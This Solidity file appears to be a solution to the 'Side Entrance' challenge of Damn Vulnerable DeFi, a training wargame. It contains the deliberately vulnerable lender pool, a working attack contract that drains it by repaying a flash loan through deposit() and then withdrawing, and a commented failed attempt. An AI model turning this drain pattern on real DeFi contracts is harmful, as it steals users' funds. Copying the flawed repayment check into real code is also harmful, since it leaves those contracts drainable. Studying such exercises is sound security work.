// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
}

contract SideEntranceAttack {
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    // require an external payable function to receive ETH
    receive() external payable {}    

    // calls flash loan at the pool balance
    // flashLoan function calls the execute contract of this function
    // execute() deposits ETH back to pool as this contract's balance
    // actually rebalances the SideEntranceLenderPool of the flash loan
    // withdraw() ETH back and transfers that amount to sender
    function attack() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() public payable {
        pool.deposit{value: msg.value}();
    }
}

// very similar attempt!
contract SideEntranceAttackAttempt {
    SideEntranceLenderPool pool;
    address attacker;

    constructor(address _pool, address _attacker) {
        pool = SideEntranceLenderPool(_pool);
        attacker = _attacker;
    }

    function attack() public {
        pool.flashLoan(address(pool).balance);
    }

    // similar implementation but this does not pass the require() at the end of flashLoan
    // flashLoan() fails before calling
    function execute() public payable {
        pool.deposit{value: msg.value}();
        pool.withdraw();
        payable(attacker).transfer(address(this).balance);
    }
}


 